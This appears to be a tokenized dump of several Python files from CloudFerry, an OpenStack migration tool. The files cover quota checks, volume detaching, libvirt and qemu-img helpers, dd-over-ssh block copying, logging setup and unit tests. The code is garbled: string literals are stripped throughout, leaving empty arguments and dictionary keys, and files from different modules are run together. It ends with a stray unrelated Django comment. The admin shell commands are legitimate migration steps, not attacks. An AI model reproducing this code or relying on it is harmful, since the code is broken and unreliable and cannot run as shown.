option_value = self . cfg . migrate [ self . option_name ] \n 
if option_value : \n 
~~~ self . set_next_path ( PATH_ONE ) \n 
~~ else : \n 
~~~ self . set_next_path ( PATH_TWO ) \n 
~~ return { } \n 
# Copyright (c) 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ from cloudferry . lib . base . action import action \n 
from cloudferry . lib . utils import log \n 
from cloudferry . lib . utils import utils as utl \n 
\n 
\n 
LOG = log . getLogger ( __name__ ) \n 
\n 
\n 
class CheckConfigQuotaNeutron ( action . Action ) : \n 
~~~ """\n    Checking config quotas between src and dst clouds.\n\n    If all tenants have customs quotas then different configurations does not\n    matter.\n    """ \n 
\n 
def run ( self , ** kwargs ) : \n 
~~~ src_cloud = self . src_cloud \n 
dst_cloud = self . dst_cloud \n 
network_src = src_cloud . resources [ utl . NETWORK_RESOURCE ] \n 
identity_dst = dst_cloud . resources [ utl . IDENTITY_RESOURCE ] \n 
network_dst = dst_cloud . resources [ utl . NETWORK_RESOURCE ] \n 
\n 
search_opts_tenant = kwargs . get ( , { } ) \n 
tenants_src = self . get_src_tenants ( search_opts_tenant ) \n 
\n 
list_quotas = network_src . list_quotas ( ) \n 
tenants_without_quotas = self . get_tenants_without_quotas ( tenants_src , \n 
list_quotas ) \n 
if not tenants_without_quotas : \n 
~~~ LOG . info ( "On SRC cloud all tenants " \n 
"have custom quotas for network" ) \n 
LOG . info ( "Difference between clouds configs " \n 
"default quotas will not calculated" ) \n 
LOG . info ( "Migration can proceed" ) \n 
return \n 
~~ LOG . info ( "Checking default quota " \n 
"configuration on source and destination cloud" ) \n 
quot = network_src . show_quota ( tenants_without_quotas [ 0 ] ) \n 
dst_temp_tenant = identity_dst . create_tenant ( "Test Tenant For Quotas" ) \n 
quot_default_dst = network_dst . show_quota ( dst_temp_tenant . id ) \n 
is_configs_different = False \n 
identity_dst . delete_tenant ( dst_temp_tenant ) \n 
for item_quot , val_quot in quot . iteritems ( ) : \n 
~~~ if val_quot != quot_default_dst [ item_quot ] : \n 
~~~ is_configs_different = True \n 
LOG . info ( "Item %s in quotas is different (SRC CLOUD: %s, " \n 
"DST CLOUD: %s)" , item_quot , val_quot , \n 
quot_default_dst [ item_quot ] ) \n 
~~ ~~ if not is_configs_different : \n 
~~~ LOG . info ( "Configs on clouds is equals" ) \n 
\n 
~~ ~~ @ staticmethod \n 
def get_tenants_without_quotas ( tenants_src , list_quotas ) : \n 
~~~ tenants_ids = tenants_src . keys ( ) \n 
quotas_ids_tenants = [ quota [ "tenant_id" ] for quota in list_quotas ] \n 
return list ( set ( tenants_ids ) - set ( quotas_ids_tenants ) ) \n 
\n 
~~ def get_src_tenants ( self , search_opts ) : \n 
~~~ identity_src = self . src_cloud . resources [ utl . IDENTITY_RESOURCE ] \n 
\n 
if search_opts . get ( ) : \n 
~~~ filter_tenants_ids_list = search_opts [ ] \n 
tenants = [ identity_src . keystone_client . tenants . find ( id = tnt_id ) for \n 
tnt_id in filter_tenants_ids_list ] \n 
~~ else : \n 
~~~ tenants = identity_src . get_tenants_list ( ) \n 
\n 
~~ tenants_dict = { tenant . id : tenant . name for tenant in tenants } \n 
\n 
return tenants_dict \n 
# Copyright (c) 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
~~ ~~ import copy \n 
import logging \n 
\n 
from oslo_config import cfg \n 
\n 
from cloudferry . lib . base . action import action \n 
from cloudferry . lib . utils import utils \n 
\n 
CONF = cfg . CONF \n 
LOG = logging . getLogger ( __name__ ) \n 
\n 
\n 
class DetachVolumesCompute ( action . Action ) : \n 
\n 
~~~ def run ( self , info , ** kwargs ) : \n 
~~~ info = copy . deepcopy ( info ) \n 
compute_resource = self . cloud . resources [ utils . COMPUTE_RESOURCE ] \n 
storage_resource = self . cloud . resources [ utils . STORAGE_RESOURCE ] \n 
for instance in info [ utils . INSTANCES_TYPE ] . itervalues ( ) : \n 
~~~ LOG . info ( "Detaching volumes for instance %s [%s]" , \n 
instance [ ] [ ] , instance [ ] [ ] ) \n 
if not instance [ ] [ utils . VOLUMES_TYPE ] : \n 
~~~ continue \n 
~~ for vol in instance [ ] [ utils . VOLUMES_TYPE ] : \n 
~~~ volume_status = storage_resource . get_status ( vol [ ] ) \n 
LOG . debug ( "Volume %s was found. Status %s" , \n 
vol [ ] , volume_status ) \n 
if volume_status == : \n 
~~~ compute_resource . detach_volume ( instance [ ] [ ] , \n 
vol [ ] ) \n 
LOG . debug ( "Detach volume %s" , vol [ ] ) \n 
timeout = CONF . migrate . storage_backend_timeout \n 
storage_resource . wait_for_status ( \n 
vol [ ] , storage_resource . get_status , , \n 
timeout = timeout ) \n 
~~ ~~ ~~ return { } \n 
# Copyright (c) 2014 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
\n 
~~ ~~ from cloudferry . lib . base . action import action \n 
from cloudferry . lib . utils . ssh_util import SshUtil \n 
\n 
\n 
class RemoteExecution ( action . Action ) : \n 
\n 
~~~ def __init__ ( self , cloud , host = None , int_host = None , config_migrate = None ) : \n 
~~~ self . cloud = cloud \n 
self . host = host \n 
self . int_host = int_host \n 
self . config_migrate = config_migrate \n 
self . remote_exec_obj = SshUtil ( self . cloud , \n 
self . config_migrate , \n 
self . host ) \n 
super ( RemoteExecution , self ) . __init__ ( { } ) \n 
\n 
~~ def run ( self , command , ** kwargs ) : \n 
~~~ self . remote_exec_obj . execute ( command , self . int_host ) \n 
return { } \n 
# Copyright 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
~~ ~~ import json \n 
import os \n 
\n 
from xml . etree import ElementTree \n 
\n 
from cloudferry . lib . utils import log \n 
\n 
LOG = log . getLogger ( __name__ ) \n 
\n 
nova_instances_path = "/var/lib/nova/instances/" \n 
\n 
\n 
def instance_path ( instance_id ) : \n 
~~~ return os . path . join ( nova_instances_path , instance_id ) \n 
\n 
\n 
~~ def instance_image_path ( instance_id ) : \n 
~~~ return os . path . join ( instance_path ( instance_id ) , "disk" ) \n 
\n 
\n 
~~ def _qemu_img_rebase ( src , dst ) : \n 
~~~ return "qemu-img rebase -b {src} {dst}" . format ( src = src , dst = dst ) \n 
\n 
\n 
~~ class QemuBackingFileMover ( object ) : \n 
~~~ def __init__ ( self , runner , src , instance_id ) : \n 
~~~ self . runner = runner \n 
self . src = src \n 
self . dst = instance_image_path ( instance_id ) \n 
\n 
~~ def __enter__ ( self ) : \n 
~~~ cmd = _qemu_img_rebase ( self . src , self . dst ) \n 
self . runner . run ( cmd ) \n 
return self \n 
\n 
~~ def __exit__ ( self , exc_type , exc_val , exc_tb ) : \n 
~~~ cmd = _qemu_img_rebase ( self . dst , self . src ) \n 
self . runner . run_ignoring_errors ( cmd ) \n 
return self \n 
\n 
\n 
~~ ~~ class DestNovaInstanceDestroyer ( object ) : \n 
~~~ """Fake instance is destroyed from libvirt as part of live migration. In\n    case something fails during live migration, this action must be rolled\n    back. The only valid rollback scenario is to delete the same instance from\n    nova DB.""" \n 
\n 
def __init__ ( self , dest_libvirt , dest_nova , libvirt_name , nova_vm_id ) : \n 
~~~ self . dest_libvirt = dest_libvirt \n 
self . dest_nova = dest_nova \n 
self . libvirt_name = libvirt_name \n 
self . nova_vm_id = nova_vm_id \n 
\n 
~~ def __enter__ ( self ) : \n 
~~~ self . do ( ) \n 
\n 
~~ def __exit__ ( self , exc_type , exc_val , exc_tb ) : \n 
~~~ self . undo ( ) \n 
\n 
~~ def do ( self ) : \n 
~~~ self . dest_libvirt . destroy_vm ( self . libvirt_name ) \n 
\n 
~~ def undo ( self ) : \n 
~~~ try : \n 
~~~ LOG . debug ( "Rolling back fake VM %s" , self . nova_vm_id ) \n 
self . dest_nova . reset_state ( self . nova_vm_id ) \n 
self . dest_nova . delete_vm_by_id ( self . nova_vm_id ) \n 
~~ except RuntimeError : \n 
\n 
~~~ pass \n 
\n 
\n 
~~ ~~ ~~ class Libvirt ( object ) : \n 
~~~ def __init__ ( self , remote_runner ) : \n 
~~~ """\n        :remote_runner: `cloudferry.lib.utils.remote_runner.RemoteRunner`\n                        object\n        """ \n 
self . runner = remote_runner \n 
\n 
~~ def get_backing_file ( self , instance_id ) : \n 
~~~ cmd = ( "qemu-img info {image_path} --output json" . format ( \n 
image_path = instance_image_path ( instance_id ) ) ) \n 
\n 
try : \n 
~~~ image_info = json . loads ( self . runner . run ( cmd ) ) \n 
return image_info [ ] \n 
~~ except ( ValueError , TypeError ) as e : \n 
~~~ LOG . error ( "Invalid value received from qemu: %s!" , e ) \n 
~~ except KeyError : \n 
~~~ LOG . warning ( "Instance \'%s\' does not have backing file associated!" , \n 
instance_id ) \n 
\n 
~~ ~~ def get_xml ( self , libvirt_instance_name ) : \n 
~~~ cmd = ( "virsh dumpxml {inst_name}" . format ( \n 
inst_name = libvirt_instance_name ) ) \n 
\n 
return LibvirtXml ( self . runner . run ( cmd ) ) \n 
\n 
~~ def destroy_vm ( self , libvirt_instance_name ) : \n 
~~~ cmds = [ \n 
"virsh destroy {instance}" . format ( instance = libvirt_instance_name ) , \n 
"virsh undefine {instance}" . format ( instance = libvirt_instance_name ) \n 
] \n 
for cmd in cmds : \n 
~~~ self . runner . run ( cmd ) \n 
\n 
~~ ~~ def move_backing_file ( self , source_file , instance_id ) : \n 
~~~ cmd = _qemu_img_rebase ( src = source_file , \n 
dst = instance_image_path ( instance_id ) ) \n 
self . runner . run ( cmd ) \n 
\n 
~~ def live_migrate ( self , libvirt_instance_name , dest_host , migration_xml ) : \n 
~~~ cmd = ( "virsh migrate --live --copy-storage-all --verbose {instance} " \n 
"qemu+tcp://{dst_host}/system " \n 
"--xml {migration_xml}" . format ( instance = libvirt_instance_name , \n 
dst_host = dest_host , \n 
migration_xml = migration_xml ) ) \n 
self . runner . run ( cmd ) \n 
\n 
\n 
~~ ~~ class LibvirtDeviceInterfaceHwAddress ( object ) : \n 
~~~ def __init__ ( self , element ) : \n 
~~~ self . type = element . get ( ) \n 
self . domain = element . get ( ) \n 
self . bus = element . get ( ) \n 
self . slot = element . get ( ) \n 
self . function = element . get ( ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return "HW Address<%s %s %s>" % ( self . type , self . bus , self . slot ) \n 
\n 
~~ def __eq__ ( self , other ) : \n 
~~~ return ( isinstance ( other , self . __class__ ) and \n 
self . type == other . type and \n 
self . domain == other . domain and \n 
self . bus == other . bus and \n 
self . slot == other . slot and \n 
self . function == other . function ) \n 
\n 
\n 
~~ ~~ class LibvirtDeviceInterface ( object ) : \n 
~~~ def __init__ ( self , interface ) : \n 
~~~ """\n        :interface: - `xml.etree.ElementTree.Element` object\n        """ \n 
self . _xml_element = interface \n 
self . mac = interface . find ( ) . get ( ) \n 
self . source_iface = interface . find ( ) . get ( ) \n 
self . target_iface = interface . find ( ) . get ( ) \n 
self . hw_address = LibvirtDeviceInterfaceHwAddress ( \n 
interface . find ( ) ) \n 
\n 
~~ def __eq__ ( self , other ) : \n 
~~~ return ( isinstance ( other , self . __class__ ) and \n 
self . source_iface == other . source_iface and \n 
self . target_iface == other . target_iface and \n 
self . hw_address == other . hw_address ) \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return "Iface<mac={mac}, src={src}, dst={dst}>" . format ( \n 
mac = self . mac , src = self . source_iface , dst = self . target_iface ) \n 
\n 
~~ @ classmethod \n 
def _replace_attr ( cls , element , attr , value ) : \n 
~~~ if element . get ( attr ) != value : \n 
~~~ element . clear ( ) \n 
element . attrib = { attr : value } \n 
\n 
~~ ~~ def element ( self ) : \n 
~~~ source = self . _xml_element . find ( ) \n 
target = self . _xml_element . find ( ) \n 
\n 
self . _replace_attr ( source , , self . source_iface ) \n 
self . _replace_attr ( target , , self . target_iface ) \n 
\n 
return self . _xml_element \n 
\n 
\n 
~~ ~~ class LibvirtXml ( object ) : \n 
~~~ def __init__ ( self , contents ) : \n 
~~~ """\n        :contents - XML file contents (text)\n        """ \n 
self . _xml = ElementTree . fromstring ( contents ) \n 
self . _interfaces = [ LibvirtDeviceInterface ( i ) \n 
for i in self . _xml . findall ( ) ] \n 
self . disk_file = self . _get ( , ) \n 
self . serial_file = self . _get ( , ) \n 
self . console_file = self . _get ( , ) \n 
\n 
~~ def _get ( self , element , attribute ) : \n 
~~~ el = self . _xml . find ( element ) \n 
if el is not None : \n 
~~~ return el . get ( attribute ) \n 
\n 
~~ ~~ def _set ( self , element , attribute , value ) : \n 
~~~ el = self . _xml . find ( element ) \n 
if el is not None : \n 
~~~ el . set ( attribute , value ) \n 
\n 
~~ ~~ @ property \n 
def interfaces ( self ) : \n 
~~~ return self . _interfaces \n 
\n 
~~ @ interfaces . setter \n 
def interfaces ( self , other ) : \n 
~~~ """Only <source bridge/> and <target dev/> elements must be updated""" \n 
if len ( self . interfaces ) != len ( other ) : \n 
~~~ raise RuntimeError ( "Source and dest have different number of " \n 
"network interfaces allocated." ) \n 
\n 
~~ for other_iface in other : \n 
~~~ for this_iface in self . interfaces : \n 
~~~ identical = ( this_iface . mac == other_iface . mac ) \n 
if identical : \n 
~~~ this_iface . source_iface = other_iface . source_iface \n 
this_iface . target_iface = other_iface . target_iface \n 
break \n 
\n 
~~ ~~ ~~ ~~ def dump ( self ) : \n 
~~~ self . _set ( , , self . disk_file ) \n 
self . _set ( , , self . serial_file ) \n 
self . _set ( , , self . console_file ) \n 
\n 
xml_devices = self . _xml . find ( ) \n 
xml_interfaces = self . _xml . findall ( ) \n 
for iface in xml_interfaces : \n 
~~~ xml_devices . remove ( iface ) \n 
\n 
~~ for iface in self . _interfaces : \n 
~~~ xml_devices . append ( iface . element ( ) ) \n 
\n 
~~ return ElementTree . tostring ( self . _xml ) \n 
# Copyright 2016 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
\n 
~~ ~~ import abc \n 
\n 
from cloudferry . lib . utils import files \n 
from cloudferry . lib . utils import remote_runner \n 
from cloudferry . lib . copy_engines import base \n 
\n 
\n 
class CopyFailed ( RuntimeError ) : \n 
~~~ pass \n 
\n 
\n 
~~ class CopyMechanism ( object ) : \n 
~~~ __metaclass__ = abc . ABCMeta \n 
\n 
@ abc . abstractmethod \n 
def copy ( self , context , source_object , destination_object ) : \n 
~~~ raise NotImplementedError ( ) \n 
\n 
\n 
~~ ~~ class CopyObject ( object ) : \n 
~~~ def __init__ ( self , host = None , path = None ) : \n 
~~~ self . host = host \n 
self . path = path \n 
\n 
~~ def __repr__ ( self ) : \n 
~~~ return "{host}:{path}" . format ( host = self . host , path = self . path ) \n 
\n 
\n 
~~ ~~ class RemoteFileCopy ( CopyMechanism ) : \n 
~~~ """Uses one of `rsync`, `bbcp` or `scp` to copy volume files across remote\n    nodes. Primarily used for NFS backend.""" \n 
\n 
def copy ( self , context , source_object , destination_object ) : \n 
~~~ data = { \n 
: source_object . host , \n 
: source_object . path , \n 
: destination_object . host , \n 
: destination_object . path \n 
} \n 
\n 
try : \n 
~~~ copier = base . get_copier ( context . src_cloud , \n 
context . dst_cloud , \n 
data ) \n 
\n 
copier . transfer ( data ) \n 
~~ except ( base . FileCopyError , \n 
base . CopierCannotBeUsed , \n 
base . CopierNotFound ) as e : \n 
~~~ msg = ( "Copying file from {src_host}@{src_file} to " \n 
"{dst_host}@{dst_file}, error: {err}" ) . format ( \n 
src_host = source_object . host , \n 
src_file = source_object . path , \n 
dst_host = destination_object . host , \n 
dst_file = destination_object . path , \n 
err = e . message ) \n 
raise CopyFailed ( msg ) \n 
\n 
\n 
~~ ~~ ~~ class CopyRegularFileToBlockDevice ( CopyMechanism ) : \n 
~~~ """Redirects regular file to stdout and copies over ssh tunnel to calling\n    node into block device""" \n 
\n 
def copy ( self , context , source_object , destination_object ) : \n 
~~~ src_user = context . cfg . src . ssh_user \n 
dst_user = context . cfg . dst . ssh_user \n 
\n 
src_host = source_object . host \n 
dst_host = destination_object . host \n 
\n 
rr = remote_runner . RemoteRunner ( src_host , src_user ) \n 
\n 
ssh_opts = ( \n 
) \n 
\n 
try : \n 
~~~ progress_view = "" \n 
if files . is_installed ( rr , "pv" ) : \n 
~~~ src_file_size = files . remote_file_size ( rr , source_object . path ) \n 
progress_view = "pv --size {size} --progress | " . format ( \n 
size = src_file_size ) \n 
\n 
~~ copy = ( "dd if={src_file} | {progress_view} " \n 
"ssh {ssh_opts} {dst_user}@{dst_host} " \n 
"\'dd of={dst_device}\'" ) \n 
rr . run ( copy . format ( src_file = source_object . path , \n 
dst_user = dst_user , \n 
dst_host = dst_host , \n 
ssh_opts = ssh_opts , \n 
dst_device = destination_object . path , \n 
progress_view = progress_view ) ) \n 
~~ except remote_runner . RemoteExecutionError as e : \n 
~~~ msg = "Cannot copy {src_object} to {dst_object}: {error}" \n 
msg = msg . format ( src_object = source_object , \n 
dst_object = destination_object , \n 
error = e . message ) \n 
raise CopyFailed ( msg ) \n 
# Copyright (c) 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
~~ ~~ ~~ import datetime \n 
import logging \n 
from logging import config \n 
from logging import handlers \n 
import os \n 
import sys \n 
\n 
from fabric import api \n 
from oslo_config import cfg \n 
import yaml \n 
\n 
from cloudferry . lib . utils import sizeof_format \n 
\n 
getLogger = logging . getLogger \n 
CONF = cfg . CONF \n 
\n 
\n 
class StdoutLogger ( object ) : \n 
~~~ """ The wrapper of stdout messages\n    Transfer all messages from stdout to cloudferry.lib.stdout logger.\n\n    """ \n 
def __init__ ( self , name = None ) : \n 
~~~ self . log = logging . getLogger ( name or ) \n 
\n 
~~ def write ( self , message ) : \n 
~~~ message = message . strip ( ) \n 
if message : \n 
~~~ self . log . info ( message ) \n 
\n 
~~ ~~ def flush ( self ) : \n 
~~~ pass \n 
\n 
\n 
~~ ~~ def configure_logging ( log_config = None , debug = None , forward_stdout = None ) : \n 
~~~ """Configure the logging\n\n    Loading logging configuration file which is defined in the general\n    configuration file and configure the logging system.\n    Setting the level of console handler to DEBUG mode if debug option is set\n    as True.\n    Wrap the stdout stream by StdoutLogger.\n    """ \n 
if log_config is None : \n 
~~~ log_config = CONF . migrate . log_config \n 
~~ if debug is None : \n 
~~~ debug = CONF . migrate . debug \n 
~~ if forward_stdout is None : \n 
~~~ forward_stdout = CONF . migrate . forward_stdout \n 
\n 
~~ with open ( log_config , ) as f : \n 
~~~ config . dictConfig ( yaml . load ( f ) ) \n 
~~ if debug : \n 
~~~ logger = logging . getLogger ( ) \n 
for handler in logger . handlers : \n 
~~~ if handler . name == : \n 
~~~ handler . setLevel ( logging . DEBUG ) \n 
~~ ~~ ~~ if forward_stdout : \n 
~~~ sys . stdout = StdoutLogger ( ) \n 
\n 
\n 
~~ ~~ class RunRotatingFileHandler ( handlers . RotatingFileHandler ) : \n 
~~~ """Handler for logging to switch the logging file every run.\n\n    The handler allows to include the scenario and the current datetime into\n    the filename.\n\n    :param filename: The template for filename\n    :param date_format: The template for formatting the current datetime\n    """ \n 
def __init__ ( self , \n 
filename = , \n 
date_format = , \n 
** kwargs ) : \n 
~~~ self . date_format = date_format \n 
max_bytes = sizeof_format . parse_size ( kwargs . pop ( , 0 ) ) \n 
\n 
super ( RunRotatingFileHandler , self ) . __init__ ( \n 
filename = self . get_filename ( filename ) , \n 
maxBytes = max_bytes , \n 
** kwargs ) \n 
\n 
~~ def get_filename ( self , filename ) : \n 
~~~ """Format the filename\n\n        :param filename: the formatting string for the filename\n        :return: Formatted filename with included scenario and\n        current datetime.\n        """ \n 
if hasattr ( CONF , ) and hasattr ( CONF . migrate , ) : \n 
~~~ scenario_filename = os . path . basename ( CONF . migrate . scenario ) \n 
scenario = os . path . splitext ( scenario_filename ) [ 0 ] \n 
~~ else : \n 
~~~ scenario = \n 
~~ dt = datetime . datetime . now ( ) . strftime ( self . date_format ) \n 
return filename % { \n 
: scenario , \n 
: dt \n 
} \n 
\n 
\n 
~~ ~~ class CurrentTaskFilter ( logging . Filter ) : \n 
~~~ """Define the current_task variable for the log messages.\n\n    :param name_format: The format of current task name.\n    Default value is %(name)s\n    """ \n 
\n 
def __init__ ( self , name_format = , ** kwargs ) : \n 
~~~ super ( CurrentTaskFilter , self ) . __init__ ( ** kwargs ) \n 
self . name_format = name_format \n 
\n 
~~ def filter ( self , record ) : \n 
~~~ current_task = self . name_format % { \n 
: api . env . current_task or , \n 
} \n 
record . current_task = current_task \n 
return True \n 
# Copyright (c) 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the License); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
# http://www.apache.org/licenses/LICENSE-2.0 \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an AS IS BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or \n 
# implied. \n 
# See the License for the specific language governing permissions and# \n 
# limitations under the License. \n 
\n 
~~ ~~ """\nThis is module to verify if rollback procedure was executed correctly.\nBasically two dictionaries are being compared:\n    - pre_data: data collected from SRC and DST clusters, is being stored in\n                file with name which is described in config file.\n    - data_after: data collected from SRC and DST clusters using data_collector\n                  module, it is being stored in memory as dictionary.\n""" \n 
\n 
import os \n 
import yaml \n 
\n 
import cloudferry_devlab . tests . config as config \n 
from cloudferry_devlab . tests . data_collector import DataCollector \n 
from cloudferry_devlab . tests import functional_test \n 
import cloudferry_devlab . tests . utils as utils \n 
\n 
\n 
class RollbackVerification ( functional_test . FunctionalTest ) : \n 
\n 
~~~ def setUp ( self ) : \n 
~~~ data_collector = DataCollector ( config = config ) \n 
\n 
self . data_after = utils . convert ( data_collector . data_collector ( ) ) \n 
\n 
file_name = config . rollback_params [ ] [ ] \n 
pre_file_path = os . path . join ( self . cloudferry_dir , file_name ) \n 
with open ( pre_file_path , "r" ) as f : \n 
~~~ self . pre_data = yaml . load ( f ) \n 
\n 
~~ ~~ def test_verify_rollback ( self ) : \n 
~~~ """Validate rollback actions run successfuly.""" \n 
self . maxDiff = None \n 
msg = \'Comparing "{0}-{1}" resources...\' \n 
for cloud in self . data_after : \n 
~~~ for service in self . data_after [ cloud ] : \n 
~~~ for resource in self . data_after [ cloud ] [ service ] : \n 
~~~ print ( msg . format ( service . lower ( ) , resource . lower ( ) ) ) \n 
self . assertEqual ( self . data_after [ cloud ] [ service ] [ resource ] , \n 
self . pre_data [ cloud ] [ service ] [ resource ] ) \n 
# Copyright 2014: Mirantis Inc. \n 
# All Rights Reserved. \n 
# \n 
#    Licensed under the Apache License, Version 2.0 (the "License"); you may \n 
#    not use this file except in compliance with the License. You may obtain \n 
#    a copy of the License at \n 
# \n 
#         http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
#    Unless required by applicable law or agreed to in writing, software \n 
#    distributed under the License is distributed on an "AS IS" BASIS, WITHOUT \n 
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the \n 
#    License for the specific language governing permissions and limitations \n 
#    under the License. \n 
\n 
\n 
~~ ~~ ~~ ~~ ~~ import mock \n 
\n 
from cloudferry . lib . os . actions import convert_volume_to_image \n 
from cloudferry . lib . utils import utils \n 
from tests import test \n 
\n 
\n 
class ConverterVolumeToImageTest ( test . TestCase ) : \n 
~~~ def setUp ( self ) : \n 
~~~ super ( ConverterVolumeToImageTest , self ) . setUp ( ) \n 
self . fake_src_cloud = mock . Mock ( ) \n 
self . fake_storage = mock . Mock ( ) \n 
self . fake_storage . deploy = mock . Mock ( ) \n 
self . fake_storage . upload_volume_to_image . return_value = ( \n 
, ) \n 
self . fake_storage . get_backend . return_value = \n 
self . fake_image = mock . Mock ( ) \n 
self . fake_image . wait_for_status = mock . Mock ( ) \n 
self . fake_image . get_image_by_id_converted = mock . Mock ( ) \n 
self . fake_image . get_image_by_id_converted . return_value = { \n 
: { \n 
: { : , : { } } } } \n 
self . fake_image . patch_image = mock . Mock ( ) \n 
self . fake_src_cloud . resources = { : self . fake_storage , \n 
: self . fake_image } \n 
self . fake_volumes_info = { \n 
: { \n 
: { \n 
: { \n 
: , \n 
: , \n 
\n 
} , \n 
: { \n 
: , \n 
} , \n 
} } , \n 
} \n 
\n 
self . fake_dst_cloud = mock . Mock ( ) \n 
self . fake_config = utils . ext_dict ( migrate = utils . ext_dict ( \n 
{ : , \n 
: } ) ) \n 
\n 
self . fake_init = { \n 
: self . fake_src_cloud , \n 
: self . fake_dst_cloud , \n 
: self . fake_config \n 
} \n 
\n 
~~ def test_action ( self ) : \n 
~~~ fake_action = convert_volume_to_image . ConvertVolumeToImage ( \n 
self . fake_init , \n 
cloud = ) \n 
res = fake_action . run ( self . fake_volumes_info ) \n 
\n 
self . assertEqual ( , \n 
res [ ] [ ] [ ] [ ] ) \n 
\n 
self . assertEqual ( , \n 
res [ ] [ ] [ ] [ ] [ \n 
] [ ] ) \n 
# Copyright 2015 Mirantis Inc. \n 
# \n 
# Licensed under the Apache License, Version 2.0 (the "License"); \n 
# you may not use this file except in compliance with the License. \n 
# You may obtain a copy of the License at \n 
# \n 
#    http://www.apache.org/licenses/LICENSE-2.0 \n 
# \n 
# Unless required by applicable law or agreed to in writing, software \n 
# distributed under the License is distributed on an "AS IS" BASIS, \n 
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. \n 
# See the License for the specific language governing permissions and \n 
# limitations under the License. \n 
~~ ~~ from cloudferry . lib . utils . cache import Memoized , Cached \n 
\n 
from tests import test \n 
\n 
\n 
class MemoizationTestCase ( test . TestCase ) : \n 
~~~ def test_treats_self_as_separate_objects ( self ) : \n 
~~~ class C ( object ) : \n 
~~~ def __init__ ( self , i ) : \n 
~~~ self . i = i \n 
\n 
~~ @ Memoized \n 
def get_i ( self ) : \n 
~~~ return self . i \n 
\n 
~~ ~~ o1 = C ( 1 ) \n 
o2 = C ( 2 ) \n 
\n 
self . assertNotEqual ( o1 . get_i ( ) , o2 . get_i ( ) ) \n 
self . assertEqual ( o1 . get_i ( ) , 1 ) \n 
self . assertEqual ( o2 . get_i ( ) , 2 ) \n 
\n 
~~ def test_takes_value_from_cache ( self ) : \n 
~~~ class C ( object ) : \n 
~~~ def __init__ ( self , i ) : \n 
~~~ self . i = i \n 
\n 
~~ @ Memoized \n 
def get_i ( self ) : \n 
~~~ return self . i \n 
\n 
~~ def set_i ( self , i ) : \n 
~~~ self . i = i \n 
\n 
~~ ~~ original = 1 \n 
o = C ( original ) \n 
self . assertEqual ( o . get_i ( ) , original ) \n 
o . set_i ( 10 ) \n 
self . assertEqual ( o . get_i ( ) , original ) \n 
\n 
\n 
~~ ~~ class CacheTestCase ( test . TestCase ) : \n 
~~~ def test_resets_cache_when_modifier_called ( self ) : \n 
~~~ @ Cached ( getter = , modifier = ) \n 
class C ( object ) : \n 
~~~ def __init__ ( self , i ) : \n 
~~~ self . i = i \n 
\n 
~~ def get_i ( self ) : \n 
~~~ return self . i \n 
\n 
~~ def set_i ( self , i ) : \n 
~~~ self . i = i \n 
\n 
~~ ~~ o = C ( 1 ) \n 
self . assertEqual ( o . get_i ( ) , 1 ) \n 
\n 
o . set_i ( 100 ) \n 
self . assertEqual ( o . get_i ( ) , 100 ) \n 
# Create your views here. \n 
